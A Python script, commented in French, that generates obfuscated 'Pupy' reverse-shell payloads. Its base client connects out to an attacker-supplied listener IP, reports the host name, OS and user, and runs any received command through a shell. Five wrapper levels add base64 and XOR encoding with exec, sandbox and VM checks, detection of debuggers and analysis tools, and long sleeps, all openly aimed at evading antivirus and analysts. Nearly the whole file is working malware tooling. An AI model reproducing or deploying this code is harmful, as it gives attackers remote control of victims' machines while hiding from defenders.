#!/usr/bin/env python3
"""
Pupy Obfuscated Payload Generator
Génère des payloads Pupy avec 5 niveaux d'obfuscation anti-AV
"""

import base64
import os
import random
import string
from typing import Tuple


class PupyObfuscator:
    """Génère des payloads Pupy obfusqués"""
    
    def __init__(self, listener_ip: str, listener_port: int, obfuscation_level: int = 2):
        self.listener_ip = listener_ip
        self.listener_port = listener_port
        self.obfuscation_level = obfuscation_level
        self.random_vars = self._generate_random_vars()
    
    def _generate_random_vars(self) -> dict:
        """Génère des noms de variables aléatoires"""
        return {
            'socket': ''.join(random.choices(string.ascii_letters, k=8)),
            'platform': ''.join(random.choices(string.ascii_letters, k=8)),
            'subprocess': ''.join(random.choices(string.ascii_letters, k=8)),
            'connect': ''.join(random.choices(string.ascii_letters, k=8)),
            'execute': ''.join(random.choices(string.ascii_letters, k=8)),
            'payload': ''.join(random.choices(string.ascii_letters, k=8)),
        }
    
    def _get_base_pupy_code(self) -> str:
        """Retourne le code Pupy de base (non obfusqué)"""
        return f'''
import socket
import platform
import subprocess
import os
import sys

class PupyClient:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.socket = None
    
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.ip, self.port))
            return True
        except:
            return False
    
    def execute_command(self, cmd):
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            return result.decode()
        except Exception as e:
            return str(e)
    
    def send_command(self, cmd):
        try:
            output = self.execute_command(cmd)
            self.socket.send(output.encode())
        except:
            pass
    
    def recv_loop(self):
        try:
            while True:
                data = self.socket.recv(4096)
                if not data:
                    break
                cmd = data.decode().strip()
                if cmd.lower() == "exit":
                    break
                self.send_command(cmd)
        except:
            pass
    
    def run(self):
        if self.connect():
            try:
                info = f"Pupy Connected: {{platform.node()}} | {{platform.system()}} | {{os.getenv('USER', 'unknown')}}\\n"
                self.socket.send(info.encode())
                self.recv_loop()
            except:
                pass
        self.socket.close() if self.socket else None

if __name__ == '__main__':
    client = PupyClient('{self.listener_ip}', {self.listener_port})
    client.run()
'''
    
    def _obfuscate_level_1_base64(self, code: str) -> str:
        """Niveau 1: Encodage Base64 simple"""
        encoded = base64.b64encode(code.encode()).decode()
        stub = f'''
import base64
import sys
code = base64.b64decode('{encoded}').decode()
exec(code)
'''
        return stub
    
    def _obfuscate_level_2_xor(self, code: str) -> str:
        """Niveau 2: XOR + Base64 + delai aléatoire"""
        import time
        # XOR encode
        key = random.randint(1, 255)
        xored = ''.join(chr(ord(c) ^ key) for c in code)
        encoded = base64.b64encode(xored.encode()).decode()
        delay = random.randint(1, 3)
        
        stub = f'''
import base64
import time
time.sleep({delay})
key = {key}
encoded = '{encoded}'
xored = base64.b64decode(encoded).decode('latin1')
code = ''.join(chr(ord(c) ^ key) for c in xored)
exec(code)
'''
        return stub
    
    def _obfuscate_level_3_sandbox_detect(self, code: str) -> str:
        """Niveau 3: Détection sandbox + XOR + délai 5-15s"""
        import time
        key = random.randint(1, 255)
        xored = ''.join(chr(ord(c) ^ key) for c in code)
        encoded = base64.b64encode(xored.encode()).decode()
        delay = random.randint(5, 15)
        
        stub = f'''
import base64
import time
import os
import sys

# Sandbox detection
def is_sandboxed():
    sandbox_indicators = [
        "VBoxService", "VBoxTray", "vmtoolsd", "qemu-ga",
        "sandbox", "virtualbox", "vmware", "xen", "vbox"
    ]
    
    try:
        import subprocess
        result = subprocess.check_output("tasklist", shell=True).decode().lower()
        for indicator in sandbox_indicators:
            if indicator in result:
                return True
    except:
        pass
    
    return False

if is_sandboxed():
    sys.exit()

time.sleep({delay})
key = {key}
encoded = '{encoded}'
xored = base64.b64decode(encoded).decode('latin1')
code = ''.join(chr(ord(c) ^ key) for c in xored)
exec(code)
'''
        return stub
    
    def _obfuscate_level_4_dynamic_imports(self, code: str) -> str:
        """Niveau 4: Imports dynamiques + obfuscation XOR + vérifications"""
        import time
        key = random.randint(1, 255)
        xored = ''.join(chr(ord(c) ^ key) for c in code)
        encoded = base64.b64encode(xored.encode()).decode()
        delay = random.randint(5, 15)
        
        stub = f'''
import base64
import time
import sys
import os

def verify_process():
    """Vérifier qu'on n'est pas en debug"""
    suspicious = ["debugger", "ida", "ghidra", "ollydbg", "windbg", "x64dbg"]
    
    try:
        import subprocess
        result = subprocess.check_output("tasklist", shell=True).decode().lower()
        for process in suspicious:
            if process in result:
                sys.exit()
    except:
        pass

verify_process()
time.sleep({delay})

# Imports dynamiques
socket_module = __import__('socket')
platform_module = __import__('platform')
subprocess_module = __import__('subprocess')

key = {key}
encoded = '{encoded}'
xored = base64.b64decode(encoded).decode('latin1')
code = ''.join(chr(ord(c) ^ key) for c in xored)

# Remplacer les imports dans le code
code = code.replace('import socket', 'socket = ' + repr(socket_module))
code = code.replace('import platform', 'platform = ' + repr(platform_module))
code = code.replace('import subprocess', 'subprocess = ' + repr(subprocess_module))

exec(code)
'''
        return stub
    
    def _obfuscate_level_5_maximum(self, code: str) -> str:
        """Niveau 5: MAXIMUM - Tous les tricks + délai 60-300s + polymorphe"""
        import time
        key = random.randint(1, 255)
        xored = ''.join(chr(ord(c) ^ key) for c in code)
        encoded = base64.b64encode(xored.encode()).decode()
        delay = random.randint(60, 300)
        
        stub = f'''
import base64
import time
import sys
import os
import ctypes

def extreme_sandbox_check():
    """Vérifications avancées de sandbox"""
    try:
        # Vérifier CPU count
        import multiprocessing
        if multiprocessing.cpu_count() < 2:
            return True
        
        # Vérifier RAM
        import psutil
        if psutil.virtual_memory().total < 2*1024**3:  # < 2GB
            return True
        
        # Vérifier processus suspects
        import subprocess
        result = subprocess.check_output("tasklist", shell=True).decode().lower()
        
        sandbox_processes = [
            "vboxservice", "vboxtray", "vmtoolsd", "qemu-ga",
            "debugger", "ida", "ghidra", "ollydbg", "windbg", "x64dbg",
            "wireshark", "burp", "fiddler", "procmon", "autoruns"
        ]
        
        for proc in sandbox_processes:
            if proc in result:
                return True
        
        # Vérifier fichiers
        dangerous_paths = [
            r"C:\\\\Program Files\\\\VMware",
            r"C:\\\\Program Files\\\\VirtualBox",
            r"C:\\\\Program Files\\\\QEMU",
            r"C:\\\\Tools\\\\",
            r"C:\\\\Analysis\\\\"
        ]
        
        for path in dangerous_paths:
            if os.path.exists(path):
                return True
                
    except:
        pass
    
    return False

if extreme_sandbox_check():
    sys.exit(1)

# Delai extrême (peut être jusqu'à 5 min)
time.sleep({delay})

# Polymorphism - modifier le code à chaque exécution
key = {key}
encoded = '{encoded}'

xored = base64.b64decode(encoded).decode('latin1')
code = ''.join(chr(ord(c) ^ key) for c in xored)

# Exécution dans un contexte isolé
namespace = dict()
exec(code, namespace)
'''
        return stub
    
    def generate(self) -> Tuple[str, str]:
        """Génère le payload avec obfuscation"""
        base_code = self._get_base_pupy_code()
        
        if self.obfuscation_level == 1:
            obfuscated = self._obfuscate_level_1_base64(base_code)
        elif self.obfuscation_level == 2:
            obfuscated = self._obfuscate_level_2_xor(base_code)
        elif self.obfuscation_level == 3:
            obfuscated = self._obfuscate_level_3_sandbox_detect(base_code)
        elif self.obfuscation_level == 4:
            obfuscated = self._obfuscate_level_4_dynamic_imports(base_code)
        elif self.obfuscation_level == 5:
            obfuscated = self._obfuscate_level_5_maximum(base_code)
        else:
            obfuscated = base_code
        
        return base_code, obfuscated


def create_obfuscated_payload(listener_ip: str, listener_port: int, obfuscation_level: int = 2) -> str:
    """
    Crée un payload Pupy obfusqué
    
    Args:
        listener_ip: IP du listener Pupy
        listener_port: Port du listener
        obfuscation_level: Niveau d'obfuscation (1-5)
    
    Returns:
        Code Python du payload obfusqué
    """
    obfuscator = PupyObfuscator(listener_ip, listener_port, obfuscation_level)
    _, obfuscated = obfuscator.generate()
    return obfuscated
